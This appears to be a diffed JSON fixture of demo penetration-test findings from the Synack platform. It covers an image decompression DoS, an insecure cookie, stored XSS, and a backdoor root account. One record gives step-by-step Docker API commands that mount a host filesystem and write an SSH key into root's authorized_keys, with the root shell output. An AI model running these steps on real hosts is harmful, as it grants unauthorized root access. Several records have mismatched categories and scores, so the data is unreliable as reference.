+        "url": "https://scrubbed.com/account/profile",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118786,
+        "number": 2,
+        "detail": "(https://srubbed.com/scrub/profile%5Cr%5Cn2), and upload the image file I’ve attached here.",
+        "url": "https://srubbed.com/scrub/profile%5Cr%5Cn2",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118787,
+        "number": 3,
+        "detail": "It’s a 5kb image, 260x260 pixels. In the image, I exchanged the 260x260 values with 0xfafa x 0xfafa (making it 64250x64250 pixels). By loading the 'whole image' into memory, it tries to allocate 4128062500 (tel:4128062500) pixels into memory, flooding the memory and causing DoS).",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118788,
+        "number": 4,
+        "detail": "As a result, you’ll see a response timeout.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-2"
+  },
+  {
+    "id": "synack-demo-h001-1",
+    "title": "Cookie not set as secure",
+    "tag_list": [
+
+    ],
+    "description": "The cookie does not appear to have the secure flag on, which makes it vulnerable to a security downgrade attack.\r\nThis is a security downgrade attack that allows disclosure of the session cookie.",
+    "impact": "A man-in-the-middle may abuse this vulnerability to hijack authenticated sessions, regardless of the fact that HTTPS is used.\r\n",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Cookie-related Flaws",
+      "parent": "Authentication/Session Management"
+    },
+    "cvss_final": 6.2,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:L/A:H",
+    "recommended_fix": "It is recommended to set the session cookie to secure.",
+    "exploitable_locations": [
+      {
+        "type": "file",
+        "value": "path/to/soluta.mov"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-24T12:26:03+00:00",
+    "resolved_at": "2023-10-06T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 118783,
+        "number": 1,
+        "detail": "Send an HTTP request to the application and check the response header `Set-Cookie`. If the header does not contain the secure flag, then it is vulnerable to attack.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118784,
+        "number": 2,
+        "detail": "The following header was seen:\r\n\r\nSet-Cookie: _session=BAh7B0kiD3Nlc3Npb25faWWUzMjJhM2EwNzdmYTdmMDBkMWNmZDcwOGYyMDMwMGU0BjsAVEkiEF9jc3JmX3RYm8zeW5NSlpGVUZBVXBVblNnVkUyaVV2c0JrdnNGMHRheEsa1E9BjsARg%3D%3D--49499a16424eadd8e63c77281b4824ed11f29db7; domain=.scrubbed.com (http://scrubbed.com); path=/; expires=Wed, 14-May-2014 07:43:43 GMT; HttpOnly\r\n",
+        "url": "http://scrubbed.com",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-1"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-17",
+    "title": " #7",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Unrestricted File Upload (No Execution Server-Side)",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 4.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/api/h6hxha7",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-21T00:00:00+00:00",
+    "resolved_at": "2023-10-07T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-17"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-34",
+    "title": " #15",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "CSRF Protection Missing",
+      "parent": "Cross-site Request Forgery (CSRF)"
+    },
+    "cvss_final": 10.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Local (L)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://login.example.com/plaintxtpwds/5l281mu",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-18T00:00:00+00:00",
+    "resolved_at": "2023-10-11T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-34"
+  },
+  {
+    "id": "synack-demo-h001-5",
+    "title": "Remote Code Execution via exposed Docker server",
+    "tag_list": [
+      {
+        "name": "Private Cloud Host",
+        "id": 36528
+      }
+    ],
+    "description": "Host  `10.2.14.146` has an open port `4243`. This port exposes a Docker Server that allows creation of remote docker containers in a privileged mode on the server's side. Remote code execution on the server managing docker containers is possible via mounting server's `rootfs` and writing an SSH key to the user `root`'s  ssh folder. Code execution is obtained with highest privileges.\n\nSame vulnerability is observed on hosts:\n- 10.2.4.186\n- 10.2.2.185\n- 10.2.14.180\n- 10.2.13.167\n- 10.2.13.162\n- 10.2.6.231\n\nRoot-level code execution was achieved on each of these hosts\n",
+    "impact": "The ability to launch docker containers in privileged mode means that an attacker has the ability to execute code within the newly created container with the following abilities:\n- Arbitrary writing to host's filesystem\n- Arbitrary access to host's network\n\nAn attacker can leverage a privileged filesystem access to obtain remote code execution by writing their SSH public key to the host.\n",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "OS Command Injection",
+      "parent": "Remote Execution"
+    },
+    "cvss_final": 10.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "recommended_fix": "Please rebind the Docker Server to localhost adapter or provide mandatory TLS authentication for clients.",
+    "exploitable_locations": [
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.14.146",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.4.186",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.2.185",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.14.180",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.1.89",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.13.167",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.13.162",
+        "port": "4243"
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "10.2.6.231",
+        "port": "4243"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-17T00:00:00+00:00",
+    "resolved_at": "2023-10-09T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 119069,
+        "number": 1,
+        "detail": "- Download docker from - https://download.docker.com/linux/static/stable/x86_64/docker-18.06.3-ce.tgz\n- Unpack it with `tar -xvf`\n- We will be using the `docker` binary\n\nThis is a docker client that allows to manage both local and remote instances of docker servers.\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119070,
+        "number": 2,
+        "detail": "- Connect to Docker Server port 4243 with the following command:\n\n```\n# ./docker -H 10.2.14.146:4243 run -it --rm   --privileged -v /:/rootfs --net host --pid host busybox\n```\nThis will create a temporary container \"busybox\" on the server. This container will have the underlying system's filesystem mounted at `/rootfs`\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119071,
+        "number": 3,
+        "detail": "- Create you ssh key with `ssh-keygen -t rsa` on your  machine\n- Switch back to the remotely running docker container\n- Use it to write the newly created public key to the victim machine's filesystem at `/rootfs/root/.ssh/authorized_keys`:\n\n```\n/rootfs/root/.ssh # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfqEaG9EQn6LdYrhFpkFKtbWT5s6CcuUuDaTL8\nDxNvm2cwmW3f3ZAZ8Ar8MI4KaWeEQ60obnf9+f0YIjv32UyOgh00EC++PnIWgvPjNBxYRfsUDY/st0l7+vSOh+tFtn6Nmmd2C63UjP\nZPa6HqTW0GwUtP/lRRleIzY+bOMIxfPxjEajUm5cBz+S6au4Qd3GBnbCfDD2uVd0QNY/iCeimYu7H7GELdWKVqzaldgASks1Ashqqr\nXE9YbLOwLclWZ1jdaC2QVAH9mhj8/f7WmS3lVJnhNptp2yGeUBw+1XkFpeYuQloqDdJqMnriyZP/M6k/qlP8k/9sopN0WoM2mSsJ s\nynack' >> authorized_keys\n```\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119072,
+        "number": 4,
+        "detail": "- Connect to the server via ssh with the created key to achieve code execution:\n\n```\n# ssh root@10.2.14.146 -i id_rsa_synack\nThe authenticity of host '10.2.14.146 (10.2.14.146)' can't be established.\nECDSA key fingerprint is SHA256:harCWF59s9JsI13O00DxgxJlDriQmrbOFkyxDk/CByE.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.2.14.146' (ECDSA) to the list of known hosts.\nLast login: Fri Aug  2 17:05:21 2019\n┌──────────────────────────────────────────────────────────────────┐\n│                                                                  │\n│                    ! ! ! W A R N I N G ! ! !                     │\n│                                                                  │\n│ This system is for the use of authorized users only.  Usage of   │\n│ this system may be monitored and recorded by system personnel.   │\n│                                                                  │\n│ Anyone using this system expressly consents to such monitoring   │\n│ and is advised that if such monitoring reveals possible          │\n│ evidence of criminal activity, system personnel may provide the  │\n│ evidence from such monitoring to law enforcement officials.      │\n│                                                                  │\n└──────────────────────────────────────────────────────────────────┘\nConfig:\n  service:     enterprise-ingest-lab\n  service_id:  8734\n  cell:        sbas\n      __|  __|_  )\n      _|  (     /   Amazon Linux AMI\n      ___|\\___|___|\nhttps://aws.amazon.com/amazon-linux-ami/2017.09-release-notes/\n47 package(s) needed for security, out of 71 available\nRun 'sudo yum update' to apply all updates.\nAmazon Linux version 2018.03 is available.\n[root@ip-10-2-14-146 ~]# id\nuid=0(root) gid=0(root) groups=0(root),501(all)\n```\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119073,
+        "number": 5,
+        "detail": "I've attached the private key I generated for the servers.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119074,
+        "number": 6,
+        "detail": "In this step I provide evidence of the same flaw on hosts:\n- 10.2.4.186\n- 10.2.2.185\n- 10.2.14.180\n- 10.2.13.167\n- 10.2.13.162\n- 10.2.6.231\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-5"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-15",
+    "title": " #6",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Incorrect Filtered Escape Characters",
+      "parent": "SQL Injection"
+    },
+    "cvss_final": 6.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/settings/82j2j9t",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-11T00:00:00+00:00",
+    "resolved_at": "2023-03-16T12:30:34+00:00",
+    "closed_at": "2023-04-30T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-15"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-13",
+    "title": " #5",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Blind",
+      "parent": "SQL Injection"
+    },
+    "cvss_final": 9.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/myaccount/kxk6zyp",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-08T00:00:00+00:00",
+    "resolved_at": "2023-08-08T12:30:34+00:00",
+    "closed_at": "2023-09-14T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-13"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-5",
+    "title": " #2",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Path Traversal",
+      "parent": "Authorization/Permissions"
+    },
+    "cvss_final": 3.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/plaintxtpwds/ei80jb9",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-02T00:00:00+00:00",
+    "resolved_at": "2023-03-19T12:30:34+00:00",
+    "closed_at": "2023-05-01T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-5"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-20",
+    "title": " #8",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Unvalidated Redirects",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 5.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Local (L)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/plaintxtpwds/76tx4lf",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-10-02T00:00:00+00:00",
+    "resolved_at": "2023-10-10T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-20"
+  },
+  {
+    "id": "synack-demo-d001-1",
+    "title": "Backdoor Root Account",
+    "tag_list": [
+
+    ],
+    "description": "A backdoor root account is enabled by default and allows for remote authentication that bypasses the restricted CLI interface. An examination of the SSH server configuration file reveals that root login is allowed over SSH. The \"PermitRootLogin\" directive is not specified and defaults to \"PermitRootLogin yes,” while the root user shell is set to /bin/bash in /etc/passwd. This backdoor root account's presence is not mentioned in any provided user documentation.\n\nIn addition, it was found that this account has a static password that is the same used across multiple OmniPlexer R210 units.",
+    "impact": "If an attacker were able to crack or retrieve the root password for the R210 units, then they would be able to gain full control over all accessible OmniPlexer (and potentially other untested models) units. In addition, this is commonly referred to as a backdoor account and it's existence could easily results in bad PR for BrandX.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Improper Input Validation (No Injection)",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 9.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "recommended_fix": "1. Evaluate the need for a root account that allows login. If not, then set the root users shell to `/sbin/nologin` in `/etc/passwd`.\n2. Disallow root login over SSH by adding the \"PermitRootLogin no\" directive to the SSH server configuration file.\n3. As with other sensitive certificates and keys on the R210, dynamically generate the root password on initial configuration to ensure the same password is not used across multiple units.",
+    "exploitable_locations": [
+      {
+        "type": "file",
+        "value": "/etc/shadow",
